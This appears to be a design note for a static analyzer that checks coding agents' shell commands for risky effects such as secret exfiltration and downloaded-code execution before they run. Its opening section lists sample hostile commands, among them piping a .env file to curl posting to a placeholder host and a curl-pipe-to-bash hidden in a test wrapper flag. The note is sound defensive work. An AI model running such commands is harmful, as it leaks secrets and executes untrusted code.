# Design Note

## Problem

Autonomous coding agents need to run commands, but shell commands are not simple labels. A command can look benign while crossing a serious boundary:

- `cargo check > ~/.zshrc`
- `cat .env | curl -d @- https://evil.example/upload`
- `go test -exec "bash -c 'curl https://x.y/p.sh | bash'" ./...`

The useful artifact is not another allowlist. It is a preflight evidence layer that makes the command's likely effects inspectable before execution.

## Honest Threat Model

This project does not prove arbitrary command safety. It performs conservative static analysis over a useful subset of coding-agent shell actions.

It should:

- catch high-risk known effects,
- expose shell structure that changes command meaning,
- escalate dynamic/unknown behavior,
- provide evidence for human or harness review.

It should not:

- execute untrusted code on the host,
- claim sandbox enforcement,
- trust an LLM as the core safety decision,
- silently allow parse failures.

## Architecture

```text
command
  -> tree-sitter-bash parse
  -> normalized shell structure
  -> predicted effects
  -> inferred flows
  -> policy decision
  -> report
```

### Parser / Normalizer

The analyzer exposes:

- commands and argv,
- redirections,
- pipelines,
- chain operators,
- command/process substitutions,
- env assignments,
- unsupported constructs.

Unsupported or partially understood structure should create review evidence; it should not disappear.

### Effect Inference

The effect model covers:

- workspace file writes,
- outside-workspace writes,
- home dotfile writes,
- deletes,
- network reads/writes,
- secret reads,
- package installs,
- project-code execution,
- dynamic shell execution,
- downloaded-code execution,
- git remote/history mutation,
- infra/cloud/container mutation,
- database mutation,
- unknown execution.

The model is intentionally partial. For example, `npm test` and `make test` can do arbitrary things, so the right decision is not `allow`; it is `allow_in_sandbox` or `ask`.

### Flow Inference

The highest-signal flows are:

- secret material flowing to network,
- network-fetched bytes flowing to an interpreter,
- network-fetched file later executed in the same command chain,
- allowed-looking wrapper flags delegating to shell execution,
- safe-looking commands redirected outside the workspace.

This is limited source/sink analysis, not general taint analysis.

### Policy

Policy decisions are intentionally asymmetric:

- false `deny` or `ask` is a product-cost problem,
- false `allow` on secret exfiltration, destructive mutation, or downloaded-code execution is a trust problem.

The evaluation gate is therefore zero high-risk false allows on the eval suite.

## Why Not LLM-Only?

An LLM can help summarize an ambiguous `ask` case, but it should not be the authority that turns a command into `allow`.

The core decision should be grounded in structured facts:

- AST node,
- argv flag,
- redirection target,
- normalized path,
- source/sink flow,
- policy rule.

## Why Not Git Rollback?

Git rollback is useful for tracked workspace files. It does not cover:

- untracked files,
- home directory,
- credentials,
- network effects,
- cloud resources,
- databases,
- Docker daemon,
- system services.

A future probe mode should run in a disposable boundary and compare predicted vs observed effects, but this repo currently focuses on static preflight evidence.

## Future Work

- Replace remaining pragmatic extraction with deeper AST-field traversal.
- Add a disposable temp-workspace probe.
- Add Docker network-off probe mode where available.
- Add policy file loading.
- Add report screenshots for flagship examples.
- Add red-team evals from new public bypass cases.
- Optionally add an LLM reviewer for `ask` cases only.
